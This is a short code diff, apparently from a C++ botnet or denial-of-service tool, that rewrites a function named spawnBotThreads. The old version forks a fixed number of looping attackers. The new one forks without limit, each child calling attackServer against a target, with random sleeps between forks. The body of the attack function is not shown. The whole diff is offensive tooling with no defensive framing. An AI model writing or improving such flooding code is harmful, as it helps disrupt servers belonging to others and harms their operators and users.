@@ -55,15 +55,17 @@ void attackServer(const std::string& target) {
 }
 
 void spawnBotThreads(const std::string& target) {
-    for (int i = 0; i < MAX_THREADS; ++i) {
-        if (fork() == 0) {
-            srand(time(NULL) ^ getpid());
-            while (true) {
-                attackServer(target);
-                sleep(rand() % 10 + 1);
-            }
+    srand(time(NULL));
+    while (true) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            attackServer(target);
             exit(0);
         }
+        else if (pid < 0) {
+            return;
+        }
+        sleep(rand() % 10 + 1);
     }
 }
 
